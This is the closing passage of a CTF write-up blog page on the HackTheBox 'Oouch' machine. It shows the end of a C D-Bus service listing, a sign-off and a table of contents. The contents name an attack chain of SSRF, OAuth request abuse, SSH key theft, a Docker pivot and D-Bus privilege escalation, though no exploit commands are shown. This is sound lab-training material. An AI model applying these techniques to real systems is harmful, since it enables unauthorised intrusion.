strerror(-r));</span><br><span class="line">                <span class="keyword">goto</span> finish;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Install the object */</span></span><br><span class="line">        r = sd_bus_add_object_vtable(bus,</span><br><span class="line">                                     &amp;slot,</span><br><span class="line">                                     <span class="string">&quot;/htb/oouch/Block&quot;</span>,  <span class="comment">/* object path */</span></span><br><span class="line">                                     <span class="string">&quot;htb.oouch.Block&quot;</span>,   <span class="comment">/* interface name */</span></span><br><span class="line">                                     block_vtable,</span><br><span class="line">                                     <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to install htb.oouch.Block: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">goto</span> finish;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Register the service name to find out object */</span></span><br><span class="line">        r = sd_bus_request_name(bus, <span class="string">&quot;htb.oouch.Block&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to acquire service name: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">goto</span> finish;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Infinite loop to process the client requests */</span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">/* Process requests */</span></span><br><span class="line">                r = sd_bus_process(bus, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to process bus: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                        <span class="keyword">goto</span> finish;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (r &gt; <span class="number">0</span>) <span class="comment">/* we processed a request, try to process another one, right-away */</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Wait for the next request to process */</span></span><br><span class="line">                r = sd_bus_wait(bus, (<span class="keyword">uint64_t</span>) <span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to wait on bus: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                        <span class="keyword">goto</span> finish;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">finish:</span><br><span class="line">        sd_bus_slot_unref(slot);</span><br><span class="line">        sd_bus_unref(bus);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> r &lt; <span class="number">0</span> ? EXIT_FAILURE : EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Hard-Box/">Hard Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Oouch/" rel="tag">Oouch</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/dbus/" rel="tag">dbus</a>, <a class="tag-link-link" href="/tags/docker/" rel="tag">docker</a>, <a class="tag-link-link" href="/tags/exploit/" rel="tag">exploit</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/oauth/" rel="tag">oauth</a>, <a class="tag-link-link" href="/tags/oauth2/" rel="tag">oauth2</a>, <a class="tag-link-link" href="/tags/uwsgi/" rel="tag">uwsgi</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-anonymous-user"><span class="toc-number">1.2.</span> <span class="toc-text">FTP anonymous user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oouch-main-application-port-5000"><span class="toc-number">1.3.</span> <span class="toc-text">Oouch main application (port 5000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Contact-Page-SSRF"><span class="toc-number">1.4.</span> <span class="toc-text">Contact Page SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oauth-Flow"><span class="toc-number">1.5.</span> <span class="toc-text">Oauth Flow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attacking-the-OAuth-%E2%80%9CConnect%E2%80%9D-request"><span class="toc-number">1.6.</span> <span class="toc-text">Attacking the OAuth “Connect” request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QTC-Documents"><span class="toc-number">1.7.</span> <span class="toc-text">QTC Documents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-Authorization-server-as-QTC"><span class="toc-number">1.8.</span> <span class="toc-text">Connecting to Authorization server as QTC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-get-user-endpoint"><span class="toc-number">1.9.</span> <span class="toc-text">API get_user endpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieving-qtc-SSH-key-through-API"><span class="toc-number">1.10.</span> <span class="toc-text">Retrieving qtc SSH key through API</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Docker-Container"><span class="toc-number">2.2.</span> <span class="toc-text">Accessing Docker Container</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DBus-htb-oouch-Block-Interface"><span class="toc-number">2.3.</span> <span class="toc-text">DBus htb.oouch.Block Interface</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-qtc-gt-docker-www-data"><span class="toc-number">2.4.</span> <span class="toc-text">Pivot qtc -&gt; docker www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DBus-privilege-escalation"><span class="toc-number">2.5.</span> <span class="toc-text">DBus privilege escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Method-1-SSH-authorized-keys"><span class="toc-number">2.5.1.</span> <span class="toc-text">Method 1: SSH authorized_keys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Method-2-Bi-directional-netcat"><span class="toc-number">2.5.2.</span> <span class="toc-text">Method 2: Bi-directional netcat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beyond-root"><span class="toc-number">3.</span> <span class="toc-text">Beyond root</span></a></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
